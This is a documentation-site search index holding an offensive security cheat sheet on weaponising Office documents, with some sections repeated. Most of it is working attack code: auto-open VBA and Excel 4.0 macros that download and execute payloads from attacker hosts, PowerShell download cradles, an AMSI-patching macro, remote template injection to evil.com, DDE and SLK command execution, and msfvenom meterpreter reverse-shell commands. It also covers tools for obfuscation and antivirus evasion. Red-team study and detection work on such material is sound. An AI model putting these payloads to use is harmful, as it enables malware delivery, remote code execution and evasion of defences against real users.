CobaltStrike Aggressor Script Addon - https://www.youtube.com/watch?v=_pwH6a-6yAQ Import .cna in Cobalt Strike Generate a new VBA payload from the CACTUSTORCH menu Download DotNetToJscript Compile it DotNetToJscript.exe - responsible for bootstrapping C# binaries (supplied as input) and converting them to JavaScript or VBScript ExampleAssembly.dll - the C# assembly that will be given to DotNetToJscript.exe. In default project configuration, the assembly just pops a message box with the text \"test\" Execute DotNetToJscript.exe and supply it with the ExampleAssembly.dll, specify the output file and the output type ps1 DotNetToJScript.exeExampleAssembly.dll -l vba -o test.vba -c cactusTorch Use the generated code to replace the hardcoded binary in CactusTorch DOCM - MMG with Custom DL + Exec Custom Download in first Macro to \"C:\\Users\\Public\\beacon.exe\" Create a custom binary execute using MMG Merge both Macro git clone https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator python MMG.py configs/generic-cmd.json malicious.vba { \"description\": \"Generic command exec payload\\nEvasion technique set to none\", \"template\": \"templates/payloads/generic-cmd-template.vba\", \"varcount\": 152, \"encodingoffset\": 5, \"chunksize\": 180, \"encodedvars\": {}, \"vars\": [], \"evasion\": [\"encoder\"], \"payload\": \"cmd.exe /c C:\\\\Users\\\\Public\\\\beacon.exe\" } Private Declare PtrSafe Function URLDownloadToFile Lib \"urlmon\" Alias \"URLDownloadToFileA\" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long Public Function DownloadFileA(ByVal URL As String, ByVal DownloadPath As String) As Boolean On Error GoTo Failed DownloadFileA = False 'As directory must exist, this is a check If CreateObject(\"Scripting.FileSystemObject\").FolderExists(CreateObject(\"Scripting.FileSystemObject\").GetParentFolderName(DownloadPath)) = False Then Exit Function Dim returnValue As Long returnValue = URLDownloadToFile(0, URL, DownloadPath, 0, 0) 'If return value is 0 and the file exist, then it is considered as downloaded correctly DownloadFileA = (returnValue = 0) And (Len(Dir(DownloadPath)) > 0) Exit Function Failed: End Function Sub AutoOpen() DownloadFileA \"http://10.10.10.10/macro.exe\", \"C:\\\\Users\\\\Public\\\\beacon.exe\" End Sub Sub Auto_Open() DownloadFileA \"http://10.10.10.10/macro.exe\", \"C:\\\\Users\\\\Public\\\\beacon.exe\" End Sub DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro Go to Developer tab on ribbon -> Insert -> More Controls -> Microsoft InkPicture Control Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle) Run = Shell(\"cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://<host>/file.exe','file.exe');Start-Process 'file.exe'\", vbNormalFocus) End Sub VBA Obfuscation # https://www.youtube.com/watch?v=L0DlPOLx2k0 $ git clone https://github.com/bonnetn/vba-obfuscator $ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin VBA Purging VBA Stomping : This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code. :warning: VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format. OfficePurge https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe OfficePurge.exe -d word -f .\\malicious.doc -m NewMacros OfficePurge.exe -d excel -f .\\payroll.xls -m Module1 OfficePurge.exe -d publisher -f .\\donuts.pub -m ThisDocument OfficePurge.exe -d word -f .\\malicious.doc -l EvilClippy Evil Clippy uses the OpenMCDF library to manipulate CFBF files. Evil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows. If you want to manipulate CFBF files manually, then FlexHEX is one of the best editors for this. # OSX/Linux mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs # Windows csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc # make macro code unaccessible is to mark the project as locked and unviewable: -u # Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag. EvilClippy.exe -r macrofile.doc VBA - Offensive Security Template Reverse Shell VBA - https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba Process Dumper - https://github.com/JohnWoodman/VBA-Macro-Dump-Process RunPE - https://github.com/itm4n/VBA-RunPE Spoof Parent - https://github.com/py7hagoras/OfficeMacro64 AMSI Bypass - https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba amsiByPassWithRTLMoveMemory - https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3 VBA macro spawning a process with a spoofed parent - https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba VBA - AMSI The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/ :warning: It appears that p-code based attacks where the VBA code is stomped will still be picked up by the AMSI engine (e.g. files manipulated by our tool EvilClippy). The AMSI engine only hooks into VBA, we can bypass it by using Excel 4.0 Macro AMSI Trigger - https://github.com/synacktiv/AMSI-Bypass Private Declare PtrSafe Function GetProcAddress Lib \"kernel32\" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr Private Declare PtrSafe Function LoadLibrary Lib \"kernel32\" Alias \"LoadLibraryA\" (ByVal lpLibFileName As String) As LongPtr Private Declare PtrSafe Function VirtualProtect Lib \"kernel32\" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long Private Declare PtrSafe Sub CopyMemory Lib \"kernel32\" Alias \"RtlMoveMemory\" (Destination As Any, Source As Any, ByVal Length As LongPtr) Private Sub Document_Open() Dim AmsiDLL As LongPtr Dim AmsiScanBufferAddr As LongPtr Dim result As Long Dim MyByteArray(6) As Byte Dim ArrayPointer As LongPtr MyByteArray(0) = 184 ' 0xB8 MyByteArray(1) = 87 ' 0x57 MyByteArray(2) = 0 ' 0x00 MyByteArray(3) = 7 ' 0x07 MyByteArray(4) = 128 ' 0x80 MyByteArray(5) = 195 ' 0xC3 AmsiDLL = LoadLibrary(\"amsi.dll\") AmsiScanBufferAddr = GetProcAddress(AmsiDLL, \"AmsiScanBuffer\") result = VirtualProtect(ByVal AmsiScanBufferAddr, 5, 64, 0) ArrayPointer = VarPtr(MyByteArray(0)) CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6 End Sub DOCX - Template Injection :warning: Does not require \"Enable Macro\" Remote Template A malicious macro is saved in a Word template .dotm file Benign .docx file is created based on one of the default MS Word Document templates Document from step 2 is saved as .docx Document from step 3 is renamed to .zip Document from step 4 gets unzipped .\\word_rels\\settings.xml.rels contains a reference to the template file. That reference gets replaced with a reference to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb). xml <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"file:///C:\\Users\\mantvydas\\AppData\\Roaming\\Microsoft\\Templates\\Polished%20resume,%20designed%20by%20MOO.dotx\" TargetMode=\"External\"/></Relationships> xml <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\" Target=\"https://evil.com/malicious.dotm\" TargetMode=\"External\"/></Relationships> File gets zipped back up again and renamed to .docx Template Injections Tools https://github.com/JohnWoodman/remoteInjector https://github.com/ryhanson/phishery $ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx [+] Opening Word document: good.docx [+] Setting Word document template to: https://secure.site.local/docs [+] Saving injected Word document to: bad.docx [*] Injected Word document has been saved! DOCX - DDE Insert > QuickPart > Field Right Click > Toggle Field Code { DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\" } SLK - Excel ID;P O;E NN;NAuto_open;ER101C1;KOut Flank;F C;X1;Y101;K0;EEXEC(\"c:\\shell.cmd\") C;X1;Y102;K0;EHALT() E References VBA RunPE Part 1 - itm4n VBA RunPE Part 2 - itm4n Office VBA AMSI Parting the veil on malicious macros - Microsoft Bypassing AMSI fro VBA - Outflank Evil Clippy MS Office Maldoc Assistant - Outflank Old schoold evil execl 4.0 macros XLM - Outflank Excel 4 Macro Generator x86/x64 - bytecod3r VBad - Pepitoh Excel 4.0 Macro Function Reference PDF Excel 4.0 Macros so hot right now - SneekyMonkey Macros and more with sharpshooter v2.0 - mdsec Further evasion in the forgotten corners of ms xls - malware.pizza Excel 4.0 macro old but new - fsx30 XLS 4.0 macros and covenant - d-sec Inject macro from a remote dotm template - ired.team Phishinh with OLE - ired.team Phishing SLK - ired.team bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships) PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018 AMSI in the heap - rmdavy WordAMSIBypass - rmdavy Dechaining macros and evading EDR - Noora Hyv\u00e4rinen Executing macros from docx with remote - RedXORBlueJuly 18, 2018 One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021 Running macros via ActiveX controls - greyhathacker - September 29, 2016 Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental","title":"Office - Attacks"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#office-attacks","text":"","title":"Office - Attacks"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#summary","text":"XLSM - Hot Manchego XLS - Macrome XLM Excel 4.0 - SharpShooter XLM Excel 4.0 - EXCELntDonut XLM Excel 4.0 - EXEC DOCM - Metasploit DOCM - Download and Execute DOCM - Macro Creator DOCM - C# converted to Office VBA macro DOCM - VBA Wscript DOCM - VBA Shell Execute Comment DOCM - VBA Spawning via svchost.exe using Scheduled Task DCOM - WMI COM functions (VBA AMSI) DOCM - winmgmts DOCM - Macro Pack - Macro and DDE DOCM - BadAssMacros DOCM - CACTUSTORCH VBA Module DOCM - MMG with Custom DL + Exec VBA Obfuscation VBA Purging OfficePurge EvilClippy VBA AMSI VBA - Offensive Security Template DOCX - Template Injection DOCX - DDE References","title":"Summary"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#xlsm-hot-manchego","text":"When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn't catch a simple lolbas payload to get a beacon on a target machine. https://github.com/FortyNorthSecurity/hot-manchego Generate CS Macro and save it to Windows as vba.txt PS> New-Item blank.xlsm PS> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /reference:EPPlus.dll hot-manchego.cs PS> .\\hot-manchego.exe .\\blank.xlsm .\\vba.txt","title":"XLSM - Hot Manchego"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#xlm-macrome","text":"XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document. This only works for Excel 4.0 macros. https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip # NOTE: The payload cannot contains NULL bytes. # Default calc msfvenom -a x86 -b '\\x00' --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread > popcalc.bin msfvenom -a x64 -b '\\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread > popcalc64.bin # Custom shellcode msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b '\\x00' msfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o shellcode-64.bin -b '\\x00' # MSF shellcode msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\\x00' -a x64 --platform windows -e x64/xor_dynamic --platform windows -f raw -o msf64.bin msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443 -b '\\x00' -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin dotnet Macrome.dll build --decoy-document decoy_document.xls --payload shellcode-86.bin --payload64-bit shellcode-64.bin # For VBA Macro Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop When using Macrome build mode, the --password flag may be used to encrypt the generated document using XOR Obfuscation. If the default password of VelvetSweatshop is used when building the document, all versions of Excel will automatically decrypt the document without any additional user input. This password can only be set in Excel 2003.","title":"XLM - Macrome"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#xlm-excel-40-sharpshooter","text":"https://github.com/mdsecactivebreach/SharpShooter # Options -rawscfile <path> Path to raw shellcode file for stageless payloads --scfile <path> Path to shellcode file as CSharp byte array python SharpShooter.py --payload slk --rawscfile shellcode.bin --output test # Creation of a VBA Macro # creates a VBA macro file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet. SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl # Creation of an Excel 4.0 SLK Macro Enabled Document ~# /!\\ The shellcode cannot contain null bytes msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b '\\x00' SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o /tmp/shellcode-86.bin -b '\\x00' SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --smuggle --template mcafee","title":"XLM Excel 4.0 - SharpShooter"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#xlm-excel-40-excelntdonut","text":"XLM (Excel 4.0) macros pre-date VBA and can be delivered in .xls files. AMSI has no visibility into XLM macros (for now) Anti-virus struggles with XLM (for now) XLM macros can access the Win32 API (virtualalloc, createthread, ...) Open an Excel Workbook. Right click on \"Sheet 1\" and click \"Insert...\". Select \"MS Excel 4.0 Macro\". Open your EXCELntDonut output file in a text editor and copy everything. Paste the EXCELntDonut output text in Column A of your XLM Macro sheet. At this point, everything is in column A. To fix that, we'll use the \"Text-to-Columns\"/\"Convert\" tool under the \"Data\" tab. Highlight column A and open the \"Text-to-Columns\" tool. Select \"Delimited\" and then \"Semicolon\" on the next screen. Select \"Finished\". Right-click on cell A1* and select \"Run\". This will execute your payload to make sure it works. To enable auto-execution, we need to rename cell A1 to \"Auto_Open\". You can do this by clicking into cell A1 and then clicking into the box that says \"A1\" just above Column A. Change the text from \"A1\"* to \"Auto_Open\". Save the file and verify that auto-execution works. :warning: If you're using the obfuscate flag, after the Text-to-columns operation, your macros won't start in A1. Instead, they'll start at least 100 columns to the right. Scroll horizontally until you see the first cell of text. Let's say that cell is HJ1. If that's the case, then complete steps 6-7 substituting HJ1 for A1 git clone https://github.com/FortyNorthSecurity/EXCELntDonut -f path to file containing your C# source code (exe or dll) -c ClassName where method that you want to call lives (dll) -m Method containing your executable payload (dll) -r References needed to compile your C# code (ex: -r 'System.Management') -o output filename --sandbox Perform basic sandbox checks. --obfuscate Perform basic macro obfuscation. # Fork git clone https://github.com/d-sec-net/EXCELntDonut/blob/master/EXCELntDonut/drive.py C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -platform:x64 -out:GruntHttpX64.exe C:\\Users\\User\\Desktop\\covenSource.cs C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -platform:x86 -out:GruntHttpX86.exe C:\\Users\\User\\Desktop\\covenSource.cs donut.exe -a1 -o GruntHttpx86.bin GruntHttpX86.exe donut.exe -a2 -o GruntHttpx64.bin GruntHttpX64.exe usage: drive.py [-h] --x64bin X64BIN --x86bin X86BIN [-o OUTPUTFILE] [--sandbox] [--obfuscate] python3 drive.py --x64bin GruntHttpx64.bin --x86bin GruntHttpx86.bin XLM: https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md","title":"XLM Excel 4.0 - EXCELntDonut"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#xlm-excel-40-exec","text":"Right Click to the current sheet Insert a Macro IntL MS Excel 4.0 Add the EXEC macro powershell =EXEC(\"poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg('http://10.10.10.10:80/update.ps1')\") =halt() Rename cell to Auto_open Hide your macro worksheet by a right mouse click on the sheet name Macro1 and selecting Hide","title":"XLM Excel 4.0 - EXEC"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-metasploit","text":"use exploit/multi/fileformat/office_word_macro set payload windows/meterpreter/reverse_http set LHOST 10.10.10.10 set LPORT 80 set DisablePayloadHandler True set PrependMigrate True set FILENAME Financial2021.docm exploit -j","title":"DOCM - Metasploit"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-download-and-execute","text":"Detected by Defender (AMSI) Sub Execute() Dim payload payload = \"powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring('http://10.10.10.10:4242/exploit');\" Call Shell(payload, vbHide) End Sub Sub Document_Open() Execute End Sub","title":"DOCM - Download and Execute"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-macro-creator","text":"https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator # Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion: C:\\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body # Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion: C:\\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o # Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion: C:\\PS> Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e","title":"DOCM - Macro Creator"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-c-converted-to-office-vba-macro","text":"A message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking the excel document is corrupted. https://github.com/trustedsec/unicorn python unicorn.py payload.cs cs macro","title":"DOCM - C# converted to Office VBA macro"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-vba-wscript","text":"https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office Sub parent_change() Dim objOL Set objOL = CreateObject(\"Outlook.Application\") Set shellObj = objOL.CreateObject(\"Wscript.Shell\") shellObj.Run(\"notepad.exe\") End Sub Sub AutoOpen() parent_change End Sub Sub Auto_Open() parent_change End Sub CreateObject(\"WScript.Shell\").Run \"calc.exe\" CreateObject(\"WScript.Shell\").Exec \"notepad.exe\"","title":"DOCM - VBA Wscript"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-vba-shell-execute-comment","text":"Set your command payload inside the Comment metadata of the document. Sub beautifulcomment() Dim p As DocumentProperty For Each p In ActiveDocument.BuiltInDocumentProperties If p.Name = \"Comments\" Then Shell (p.Value) End If Next End Sub Sub AutoExec() beautifulcomment End Sub Sub AutoOpen() beautifulcomment End Sub","title":"DOCM - VBA Shell Execute Comment"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-vba-spawning-via-svchostexe-using-scheduled-task","text":"Sub AutoOpen() Set service = CreateObject(\"Schedule.Service\") Call service.Connect Dim td: Set td = service.NewTask(0) td.RegistrationInfo.Author = \"Kaspersky Corporation\" td.settings.StartWhenAvailable = True td.settings.Hidden = False Dim triggers: Set triggers = td.triggers Dim trigger: Set trigger = triggers.Create(1) Dim startTime: ts = DateAdd(\"s\", 30, Now) startTime = Year(ts) & \"-\" & Right(Month(ts), 2) & \"-\" & Right(Day(ts), 2) & \"T\" & Right(Hour(ts), 2) & \":\" & Right(Minute(ts), 2) & \":\" & Right(Second(ts), 2) trigger.StartBoundary = startTime trigger.ID = \"TimeTriggerId\" Dim Action: Set Action = td.Actions.Create(0) Action.Path = \"C:\\Windows\\System32\\powershell.exe\" Action.Arguments = \"-nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))\" Call service.GetFolder(\"\\\").RegisterTaskDefinition(\"AVUpdateTask\", td, 6, , , 3) End Sub Rem powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))\"","title":"DOCM - VBA Spawning via svchost.exe using Scheduled Task"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-wmi-com-functions","text":"Basic WMI exec (detected by Defender) : r = GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\").Create(\"calc.exe\", null, null, intProcessID) Sub wmi_exec() strComputer = \".\" Set objWMIService = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\") Set objStartUp = objWMIService.Get(\"Win32_ProcessStartup\") Set objProc = objWMIService.Get(\"Win32_Process\") Set procStartConfig = objStartUp.SpawnInstance_ procStartConfig.ShowWindow = 1 objProc.Create \"powershell.exe\", Null, procStartConfig, intProcessID End Sub https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3 https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2 Sub ASR_bypass_create_child_process_rule5() Const HIDDEN_WINDOW = 0 strComputer = \".\" Set objWMIService = GetObject(\"win\" & \"mgmts\" & \":\\\\\" & strComputer & \"\\root\" & \"\\cimv2\") Set objStartup = objWMIService.Get(\"Win32_\" & \"Process\" & \"Startup\") Set objConfig = objStartup.SpawnInstance_ objConfig.ShowWindow = HIDDEN_WINDOW Set objProcess = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\" & \"\\cimv2\" & \":Win32_\" & \"Process\") objProcess.Create \"cmd.exe /c powershell.exe IEX ( IWR -uri 'http://10.10.10.10/stage.ps1')\", Null, objConfig, intProcessID End Sub Sub AutoExec() ASR_bypass_create_child_process_rule5 End Sub Sub AutoOpen() ASR_bypass_create_child_process_rule5 End Sub Const ShellWindows = \"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}\" Set SW = GetObject(\"new:\" & ShellWindows).Item() SW.Document.Application.ShellExecute \"cmd.exe\", \"/c powershell.exe\", \"C:\\Windows\\System32\", Null, 0","title":"DOCM - WMI COM functions"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docmxlm-macro-pack-macro-and-dde","text":"Only the community version is available online. https://github.com/sevagas/macro_pack # Options -G, --generate=OUTPUT_FILE_PATH. Generates a file. -t, --template=TEMPLATE_NAME Use code template already included in MacroPack -o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate functions and variables name) # Execute a command echo \"calc.exe\" | macro_pack.exe -t CMD -G cmd.xsl # Download and execute a file echo <file_to_drop_url> \"<download_path>\" | macro_pack.exe -t DROPPER -o -G dropper.xls # Meterpreter reverse TCP template using MacroMeter by Cn33liz echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.docm # Drop and execute embedded file macro_pack.exe -t EMBED_EXE --embed=c:\\windows\\system32\\calc.exe -o -G my_calc.vbs # Obfuscate the vba file generated by msfvenom and put result in a new vba file. msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba # Obfuscate Empire stager vba file and generate a MS Word document: macro_pack.exe -f empire.vba -o -G myDoc.docm # Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe) echo \"https://myurl.url/payload.exe\" \"dropped.exe\" | macro_pack.exe -o -t DROPPER -G \"drop.xlsm\" # Execute calc.exe via Dynamic Data Exchange (DDE) attack echo calc.exe | macro_pack.exe --dde -G calc.xslx # Download and execute file via powershell using Dynamic Data Exchange (DDE) attack macro_pack.exe --dde -f ..\\resources\\community\\ps_dl_exec.cmd -G DDE.xsl # PRO: Generate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV). msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o --autopack --keep-alive -G out.docm # PRO: Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass AMSI and most antiviruses. msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o --autopack --trojan -G hotpics.pptm # PRO: Generate an HTA payload able to run a shellcode via Excel injection echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE --run-in-excel -o -G samples\\nicepic.hta echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE -o --hta-macro --run-in-excel -G samples\\my_shortcut.lnk # PRO: XLM Injection echo \"MPPro\" | macro_pack.exe -G _samples\\hello.doc -t HELLO --xlm --run-in-excel # PRO: ShellCode Exec - Heap Injection, AlternativeInjection echo \"x32calc.bin\" | macro_pack.exe -t SHELLCODE -o --shellcodemethod=HeapInjection -G test.doc echo \"x32calc.bin\" | macro_pack.exe -t SHELLCODE -o --shellcodemethod=AlternativeInjection --background -G test.doc # PRO: More shellcodes echo x86.bin | macro_pack.exe -t SHELLCODE -o -G test.pptm \u2013keep-alive echo \"x86.bin\" \"x64.bin\" | macro_pack.exe -t AUTOSHELLCODE -o \u2013autopack -G sc_auto.doc echo \"http://192.168.5.10:8080/x32calc.bin\" \"http://192.168.5.10:8080/x64calc.bin\" | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\\sc_dl.xls","title":"DOCM/XLM - Macro Pack - Macro and DDE"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-badassmacros","text":"C# based automated Malicous Macro Generator. https://github.com/Inf0secRabbit/BadAssMacros BadAssMacros.exe -h # Create VBA for classic shellcode injection from raw shellcode BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s classic -c <caesar_shift_value> -o <path_to_output_file> BadAssMacros.exe -i .\\Desktop\\payload.bin -w doc -p no -s classic -c 23 -o .\\Desktop\\output.txt # Create VBA for indirect shellcode injection from raw shellcode BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s indirect -o <path_to_output_file> # List modules inside Doc/Excel file BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -l # Purge Doc/Excel file BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -o <path_to_output_file> -m <module_name>","title":"DOCM - BadAssMacros"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-cactustorch-vba-module","text":"CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript https://github.com/mdsecactivebreach/CACTUSTORCH https://github.com/tyranid/DotNetToJScript/ CACTUSTORCH - DotNetToJScript all the things - https://youtu.be/YiaKb8nHFSY CACTUSTORCH - CobaltStrike Aggressor Script Addon - https://www.youtube.com/watch?v=_pwH6a-6yAQ Import .cna in Cobalt Strike Generate a new VBA payload from the CACTUSTORCH menu Download DotNetToJscript Compile it DotNetToJscript.exe - responsible for bootstrapping C# binaries (supplied as input) and converting them to JavaScript or VBScript ExampleAssembly.dll - the C# assembly that will be given to DotNetToJscript.exe. In default project configuration, the assembly just pops a message box with the text \"test\" Execute DotNetToJscript.exe and supply it with the ExampleAssembly.dll, specify the output file and the output type ps1 DotNetToJScript.exeExampleAssembly.dll -l vba -o test.vba -c cactusTorch Use the generated code to replace the hardcoded binary in CactusTorch","title":"DOCM - CACTUSTORCH VBA Module"},{"location":"Methodology%20and%20Resources/Office%20-%20Attacks/#docm-mmg-with-custom-dl-exec","text":"Custom Download in first Macro to \"C:\\Users\\Public\\beacon.exe\" Create a custom binary execute using MMG Merge both Macro git clone https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator python MMG.py configs/generic-cmd.json malicious.vba { \"description\": \"Generic command exec payload\\nEvasion technique set to none\", \"template\": \"templates/payloads/generic-cmd-template.vba\", \"varcount\": 152, \"encodingoffset\": 5, \"chunksize\": 180, \"encodedvars\": {}, \"vars\": [], \"evasion\": [\"encoder\"], \"payload\": \"cmd.exe /c C:\\\\Users\\\\Public\\\\beacon.exe\" } Private Declare PtrSafe Function URLDownloadToFile Lib \"urlmon\" Alias \"URLDownloadToFileA\" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long Public Function DownloadFileA(ByVal URL As String, ByVal DownloadPath As String) As Boolean On Error GoTo Failed DownloadFileA = False 'As directory must exist, this is a check 